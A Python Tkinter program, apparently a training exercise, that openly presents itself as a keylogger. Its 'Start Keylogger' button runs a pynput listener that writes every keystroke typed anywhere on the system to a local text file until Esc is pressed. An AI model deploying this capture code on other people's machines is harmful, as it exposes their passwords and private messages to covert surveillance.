import tkinter as tk
from pynput.keyboard import Key, Listener

# The file where keystrokes will be logged
log_file = "C:/Users/USER/Desktop/Prodigy/KeyLogger/captured_text.txt"


# Function to log the input text when the button is clicked
def log_keystrokes():
    user_input = entry.get()

    # Write the entered text to the log file
    with open(log_file, "a") as f:
        f.write(user_input + "\n")

    # Clear the entry field after logging
    entry.delete(0, tk.END)


# Function to start keylogger
def on_press(key):
    key = str(key).replace("'", "")
    with open(log_file, "a") as f:
        f.write(key + "\n")

# Define the listener to stop on an escape key press (for stopping the keylogger)
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Start the keylogger
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# Tkinter window setup
root = tk.Tk()
root.title("Keylogger")
root.geometry("400x200")  # Set window size


# Function to change cursor style on hover
def on_enter(e):
    e.widget.config(cursor="hand2")


def on_leave(e):
    e.widget.config(cursor="")

# Input label
label = tk.Label(root, text="Enter Text to Log:")
label.pack(pady=5)

# Entry widget for input
entry = tk.Entry(root, width=40, bd=3, relief="solid", font=("Helvetica", 12))
entry.pack(pady=5)

# Focus behavior for Entry widget (focus when clicked)
entry.bind("<FocusIn>", lambda event: entry.config(bg="#e0f7fa"))  # Light blue on focus
entry.bind("<FocusOut>", lambda event: entry.config(bg="white"))  # White on focus out

# Log Button with custom styling
log_button = tk.Button(
    root,
    text="Log Text",
    command=log_keystrokes,
    bg="#00796b",
    fg="white",
    font=("Helvetica", 10, "bold"),
    activebackground="#004d40",
    activeforeground="white",
    relief="flat",
    borderwidth=5,
)
log_button.pack(pady=10)
log_button.bind("<Enter>", on_enter)
log_button.bind("<Leave>", on_leave)

# Keylogger Start Button with custom styling
start_button = tk.Button(
    root,
    text="Start Keylogger",
    command=start_keylogger,
    bg="#0288d1",
    fg="white",
    font=("Helvetica", 10, "bold"),
    activebackground="#01579b",
    activeforeground="white",
    relief="flat",
    borderwidth=5,
)
start_button.pack(pady=10)
start_button.bind("<Enter>", on_enter)
start_button.bind("<Leave>", on_leave)

# Run the Tkinter main loop
root.mainloop()
